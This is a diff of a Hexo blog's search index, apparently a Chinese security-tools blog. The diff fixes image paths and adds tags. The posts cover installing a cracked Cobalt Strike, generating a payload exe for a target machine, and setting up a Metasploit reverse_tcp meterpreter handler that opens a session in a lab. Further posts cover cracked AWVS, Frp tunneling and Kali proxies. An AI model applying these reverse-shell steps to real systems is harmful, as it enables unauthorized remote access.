@@ -3,7 +3,7 @@
   <entry>
     <title>Cobalt Strike 安装</title>
     <url>/posts/431a3a09.html</url>
-    <content><![CDATA[<img src="/posts/undefined/1.jpg" class="" title="This is an 1 image">
+    <content><![CDATA[<img src="/posts/431a3a09/1.jpg" class="" title="This is an 1 image">
 <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Cobalt Strike 分为客户端和服务端，可分布式操作、协同作战。服务器端只能运行在Linux系统中，可搭建在VPS上。</p>
 <a id="more"></a>
 <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Cobalt Strike 1.4 破解汉化版<br>服务器：Centos 7.6<br>客户端：Windows 10</p>
@@ -15,27 +15,33 @@
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">./teamserver<span class="built_in"> IP </span>pass</span><br></pre></td></tr></table></figure>
 
 <h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>要配置好Java环境<br>运行<code>cobaltstrike.bat</code></p>
-<img src="/posts/undefined/2.png" class="" title="This is an 2 image">
-<img src="/posts/undefined/3.png" class="" title="This is an 3 image">
+<img src="/posts/431a3a09/2.png" class="" title="This is an 2 image">
+<img src="/posts/431a3a09/3.png" class="" title="This is an 3 image">
 
 <h2 id="简单的攻击"><a href="#简单的攻击" class="headerlink" title="简单的攻击"></a>简单的攻击</h2><p>创建监听器</p>
-<img src="/posts/undefined/4.png" class="" title="This is an 4 image">
+<img src="/posts/431a3a09/4.png" class="" title="This is an 4 image">
 <p>创建payload</p>
-<img src="/posts/undefined/5.png" class="" title="This is an 5 image">
+<img src="/posts/431a3a09/5.png" class="" title="This is an 5 image">
 <p>把exe文件放到靶机内运行</p>
-<img src="/posts/undefined/6.png" class="" title="This is an 6 image">
-<img src="/posts/undefined/7.png" class="" title="This is an 7 image">
+<img src="/posts/431a3a09/6.png" class="" title="This is an 6 image">
+<img src="/posts/431a3a09/7.png" class="" title="This is an 7 image">
 <p>完成</p>
 <h2 id="结合msf反弹shell"><a href="#结合msf反弹shell" class="headerlink" title="结合msf反弹shell"></a>结合msf反弹shell</h2><p>打开kali开启msf</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lhost 127.0.0.1</span><br><span class="line">lhost =&gt; 127.0.0.1</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 1.</span><br><span class="line">[*] Exploit completed, but <span class="literal">no</span> session was created.</span><br><span class="line"></span><br><span class="line">[!] You are binding <span class="keyword">to</span> a loopback<span class="built_in"> address </span>by setting LHOST <span class="keyword">to</span> 127.0.0.1. Did you want ReverseListenerBindAddress?</span><br><span class="line">[*] Started reverse TCP handler on 127.0.0.1:4444</span><br></pre></td></tr></table></figure>
 <p>在靶机中使用CS创建一个windows/foreign/reverse_tcp<br>host 填写为msf的ip，port填写刚才设置的ip</p>
-<img src="/posts/undefined/8.png" class="" title="This is an 8 image">
+<img src="/posts/431a3a09/8.png" class="" title="This is an 8 image">
 <p>配置后门</p>
-<img src="/posts/undefined/9.png" class="" title="This is an 9 image">
+<img src="/posts/431a3a09/9.png" class="" title="This is an 9 image">
 <p>在靶机上运行<br>回到kali中查看msf</p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; [*] Sending stage (<span class="number">180291</span> bytes) to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">4444</span> -&gt; <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">36264</span>) at <span class="number">2020</span><span class="number">-03</span><span class="number">-03</span> <span class="number">01</span>:<span class="number">28</span>:<span class="number">06</span> <span class="number">-0500</span></span><br></pre></td></tr></table></figure>
 <p>成功获得会话</p>
 ]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>CobaltStrike</tag>
+      </tags>
   </entry>
   <entry>
     <title>Frp-内网穿透工具</title>
@@ -66,6 +72,14 @@
 <figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/<span class="keyword">handler</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lhost <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lport <span class="number">4444</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br></pre></td></tr></table></figure>
 <p>成功！</p>
 ]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>Metasploit</tag>
+        <tag>Frp</tag>
+        <tag>Kali</tag>
+      </tags>
   </entry>
   <entry>
     <title>AWVS Linux 破解版在 Centos7 下安装过程</title>
@@ -94,6 +108,12 @@
 <p>【前提-卸载已有版本】：首先必须要卸载原有的awvs12，或者其它老的版本，如果你没有安装过，可以忽略这段落。懒得打你就复制命令。懒得打你就复制命令。懒得打你就复制命令。<br>直接执行以下命令进行卸载。</p>
 <p>##停止服务，<br>systemctl stop acunetix_trial.service<br>##第一步，删除软件安装的目录。<br>rm -rf /home/acunetix/<br>##第二步，删除awvs建立的用户。在/etc/passwd 里面<br>userdel acunetix<br>##不管怎么样，重启一下<br>reboot<br>【安装前奏-准备环境–必要】：再说一次，我是CentOS Linux release 7.6.181</p>
 ]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>AWVS</tag>
+      </tags>
   </entry>
   <entry>
     <title>Kali Linux基础配置</title>
@@ -117,6 +137,12 @@
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">socks5 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br></pre></td></tr></table></figure>
 <h2 id="FoxyProxy-Options"><a href="#FoxyProxy-Options" class="headerlink" title="FoxyProxy Options"></a>FoxyProxy Options</h2><p>安装火狐插件 FoxyProxy Options 添加代理 方便浏览网页</p>
 ]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+      </tags>
   </entry>
   <entry>
     <title>CSRF</title>
